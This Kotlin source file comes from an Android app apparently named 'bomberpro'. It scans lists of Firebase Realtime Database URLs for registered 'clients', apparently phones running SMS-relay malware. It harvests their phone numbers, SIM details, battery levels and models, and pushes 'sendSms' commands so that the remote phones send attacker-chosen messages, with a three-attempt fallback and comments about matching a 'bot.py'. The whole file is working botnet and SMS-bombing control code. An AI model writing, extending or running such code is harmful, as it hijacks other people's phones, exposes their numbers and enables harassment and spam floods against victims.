package com.sanji.bomberpro.services

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import com.sanji.bomberpro.data.FirebaseNode
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit

data class Device(
    val firebaseUrl: String,
    val firebaseLabel: String,
    val firebaseId: String,
    val deviceId: String,
    val deviceName: String,
    val phone: String?,
    val battery: Int?,
    val sims: List<Map<String, Any?>>,
    val shortId: String,
    val lastSeen: Long,
    val model: String? = null,
    val android: String? = null,
)

data class SendResult(
    val ok: Boolean,
    val deviceId: String,
    val firebaseUrl: String,
    val error: String? = null,
)

class RealtimeDbService {

    // timeouts match bot.py: connect 5s, read 8s, total call 15s
    private val http: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .writeTimeout(5, TimeUnit.SECONDS)
        .callTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val jsonMedia = "application/json; charset=utf-8".toMediaType()

    private val pathCache = ConcurrentHashMap<String, String>()

    // ============================================================
    //  FIREBASES FROM FIRESTORE
    // ============================================================
    suspend fun loadFirebases(): List<FirebaseNode> = withContext(Dispatchers.IO) {
        try {
            val snap = FirebaseFirestore.getInstance()
                .collection(FirebaseConfig.COL_FIREBASES)
                .get()
                .await()

            val list = snap.documents.mapNotNull { doc ->
                val url = doc.getString("url") ?: return@mapNotNull null
                if (url.isBlank()) return@mapNotNull null
                val enabled = doc.getBoolean("enabled") ?: true
                if (!enabled) return@mapNotNull null
                FirebaseNode(
                    id = doc.id,
                    url = url,
                    label = doc.getString("label") ?: "Firebase",
                    enabled = true,
                )
            }

            if (list.isNotEmpty()) list
            else FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        } catch (e: Exception) {
            Log.w(TAG, "loadFirebases failed", e)
            FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        }
    }

    // ============================================================
    //  SCAN — all firebases in parallel · devices in parallel
    // ============================================================
    suspend fun scanAll(
        firebases: List<FirebaseNode>,
        onProgress: ((index: Int, devicesFound: Int) -> Unit)? = null,
    ): List<Device> = withContext(Dispatchers.IO) {
        if (firebases.isEmpty()) return@withContext emptyList<Device>()

        // semaphore per device (bot uses 400, Android safe at 60)
        val deviceSem = Semaphore(60)

        coroutineScope {
            val all = firebases.mapIndexed { idx, fb ->
                async {
                    try {
                        scanFirebase(fb, deviceSem) { count ->
                            onProgress?.invoke(idx, count)
                        }
                    } catch (e: CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
                        emptyList<Device>()
                    }
                }
            }.awaitAll().flatten()

            all
        }
    }

    // ============================================================
    //  SCAN ONE FIREBASE — bot-parity
    // ============================================================
    private suspend fun scanFirebase(
        fb: FirebaseNode,
        deviceSem: Semaphore,
        onProgress: ((found: Int) -> Unit)? = null,
    ): List<Device> = coroutineScope {
        val baseUrl = fb.url.trimEnd('/')
        val clientsUrl = baseUrl + FirebaseConfig.RTDB_CLIENTS

        // 1. shallow list of device IDs
        val bodyText: String? = try {
            val req = Request.Builder()
                .url(clientsUrl)
                .header("Accept", "application/json")
                .get()
                .build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) {
                    Log.w(TAG, "scan ${fb.label}: HTTP ${resp.code}")
                    null
                } else {
                    resp.body?.string()?.trim()
                }
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "scan ${fb.label} list failed: ${e.message}")
            null
        }

        if (bodyText == null || bodyText.isEmpty() || bodyText == "null") {
            return@coroutineScope emptyList<Device>()
        }

        val idsObj = try {
            JSONObject(bodyText)
        } catch (e: Exception) {
            Log.w(TAG, "scan ${fb.label} parse failed: ${e.message}")
            return@coroutineScope emptyList<Device>()
        }

        val deviceIds = mutableListOf<String>()
        val keys = idsObj.keys()
        while (keys.hasNext()) deviceIds.add(keys.next())
        if (deviceIds.isEmpty()) return@coroutineScope emptyList<Device>()

        // 2. fetch each device in parallel — semaphore capped
        val found = java.util.Collections.synchronizedList(mutableListOf<Device>())

        deviceIds.map { devId ->
            async(Dispatchers.IO) {
                try {
                    deviceSem.withPermit {
                        val dev = fetchDevice(fb, devId)
                        if (dev != null) {
                            found.add(dev)
                            onProgress?.invoke(found.size)
                        }
                    }
                } catch (e: CancellationException) {
                    throw e
                } catch (_: Exception) {}
            }
        }.awaitAll()

        found.toList()
    }

    // ============================================================
    //  FETCH ONE DEVICE
    // ============================================================
    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
        return try {
            val url = fb.url.trimEnd('/') + "/clients/$devId.json"
            val req = Request.Builder()
                .url(url)
                .header("Accept", "application/json")
                .get()
                .build()

            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                val body = resp.body?.string()?.trim() ?: return null
                if (body.isEmpty() || body == "null") return null

                val obj = try { JSONObject(body) } catch (_: Exception) { return null }
                if (!isOnline(obj)) return null

                Device(
                    firebaseUrl = fb.url,
                    firebaseLabel = fb.label,
                    firebaseId = fb.id,
                    deviceId = devId,
                    deviceName = extractDeviceName(obj),
                    phone = extractPhone(obj),
                    battery = extractBattery(obj),
                    sims = parseSims(obj),
                    shortId = shortCode(devId),
                    lastSeen = extractLastSeen(obj),
                    model = obj.optString("model", obj.optString("deviceModel", null)),
                    android = obj.optString("androidVersion", obj.optString("sdk", null)),
                )
            }
        } catch (_: Exception) {
            null
        }
    }

    // ============================================================
    //  IS ONLINE — bot-parity
    //  Bot: bool flags, status bool, status string, lastSeen <60s
    // ============================================================
    private fun isOnline(obj: JSONObject): Boolean {
        // 1. boolean-ish flags
        for (key in listOf("isOnline", "online", "connected", "active")) {
            val v = obj.opt(key) ?: continue
            if (v is Boolean && v) return true
            if (v is Number && v.toInt() == 1) return true
            if (v is String) {
                val s = v.lowercase()
                if (s == "true" || s == "yes" || s == "1") return true
            }
        }

        // 2. status — could be bool or string
        val st = obj.opt("status")
        if (st is Boolean && st) return true
        if (st is String) {
            val s = st.lowercase()
            if (s == "online" || s == "active" || s == "connected" || s == "1") return true
        }

        // 3. last seen within 60s
        val lastSeen = obj.opt("lastSeen") ?: obj.opt("last_seen") ?: obj.opt("lastOnline")
        try {
            if (lastSeen != null) {
                var iv = when (lastSeen) {
                    is Number -> lastSeen.toLong()
                    is String -> lastSeen.toLongOrNull() ?: 0L
                    else -> 0L
                }
                if (iv > 10_000_000_000L) iv /= 1000L
                if (iv > 0 && System.currentTimeMillis() / 1000L - iv < 60) return true
            }
        } catch (_: Exception) {}

        return false
    }

    // ============================================================
    //  EXTRACTORS — bot-parity
    // ============================================================
    private fun extractDeviceName(obj: JSONObject): String {
        for (k in listOf("deviceName", "name", "model", "device", "brand")) {
            val v = obj.optString(k, "")
            if (v.isNotBlank()) return v.take(64)
        }
        return "device"
    }

    private fun extractPhone(obj: JSONObject): String? {
        val keys = listOf("phoneNumber", "phone", "number", "msisdn", "simNumber", "phone_number", "PhoneNumber", "Phone")
        for (k in keys) {
            val v = obj.optString(k, "")
            if (v.isNotBlank() && v.length >= 7) return v
        }
        val simsArr = obj.optJSONArray("sims") ?: obj.optJSONArray("sim")
        if (simsArr != null) {
            for (i in 0 until simsArr.length()) {
                val s = simsArr.optJSONObject(i) ?: continue
                for (k in keys) {
                    val v = s.optString(k, "")
                    if (v.isNotBlank() && v.length >= 7) return v
                }
            }
        }
        val dev = obj.optJSONObject("device") ?: obj.optJSONObject("deviceInfo")
        if (dev != null) {
            for (k in keys) {
                val v = dev.optString(k, "")
                if (v.isNotBlank() && v.length >= 7) return v
            }
        }
        return null
    }

    private fun extractBattery(obj: JSONObject): Int? {
        for (k in listOf("battery", "batteryLevel", "batteryPercentage")) {
            if (obj.has(k) && !obj.isNull(k)) {
                try {
                    val v = obj.optInt(k, -1)
                    if (v in 0..100) return v
                } catch (_: Exception) {}
            }
        }
        return null
    }

    private fun extractLastSeen(obj: JSONObject): Long {
        for (k in listOf("lastSeen", "last_seen", "lastOnline", "lastPing")) {
            if (obj.has(k) && !obj.isNull(k)) {
                try {
                    var iv = obj.optLong(k, 0L)
                    if (iv > 10_000_000_000L) iv /= 1000L
                    if (iv > 0) return iv
                } catch (_: Exception) {}
            }
        }
        return 0L
    }

    private fun parseSims(obj: JSONObject): List<Map<String, Any?>> {
        val sims = obj.optJSONArray("sims") ?: obj.optJSONArray("sim") ?: return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        for (i in 0 until sims.length()) {
            val s = sims.optJSONObject(i) ?: continue
            out.add(
                mapOf(
                    "simSlotIndex" to s.optInt("simSlotIndex", s.optInt("slot", 0)),
                    "phoneNumber" to s.optString("phoneNumber", null),
                )
            )
        }
        return out
    }

    private fun shortCode(devId: String): String {
        return if (devId.length <= 8) devId else "${devId.take(4)}…${devId.takeLast(4)}"
    }

    // ============================================================
    //  SEND SMS — bot-parity · 3-attempt fallback
    // ============================================================
    suspend fun sendSms(
        firebaseUrl: String,
        deviceId: String,
        simSlot: Int,
        to: String,
        message: String,
    ): SendResult = withContext(Dispatchers.IO) {
        val ts = System.currentTimeMillis() / 1000L
        val toEscaped = escapeJson(to)
        val msgEscaped = escapeJson(message)

        val attempts = listOf(
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":$simSlot,"to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":"$simSlot","to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/messages.json",
                """{"phone":$toEscaped,"text":$msgEscaped,"sim":$simSlot,"timestamp":$ts}"""
            ),
        )

        for ((path, body) in attempts) {
            try {
                val url = firebaseUrl.trimEnd('/') + path
                val req = Request.Builder()
                    .url(url)
                    .put(body.toRequestBody(jsonMedia))
                    .build()

                http.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        return@withContext SendResult(
                            ok = true,
                            deviceId = deviceId,
                            firebaseUrl = firebaseUrl,
                        )
                    }
                }
            } catch (e: CancellationException) {
                throw e
            } catch (_: Exception) {
                // try next
            }
        }

        SendResult(
            ok = false,
            deviceId = deviceId,
            firebaseUrl = firebaseUrl,
            error = "all attempts failed",
        )
    }

    // ============================================================
    //  PATH CACHE
    // ============================================================
    fun getCachedPath(fbId: String, devId: String): String? =
        pathCache["$fbId:$devId"]

    fun setCachedPath(fbId: String, devId: String, path: String) {
        pathCache["$fbId:$devId"] = path
    }

    fun clearPathCache(fbId: String, devId: String) {
        pathCache.remove("$fbId:$devId")
    }

    private fun escapeJson(s: String): String = JSONObject.quote(s)

    companion object {
        private const val TAG = "RealtimeDbService"
    }
}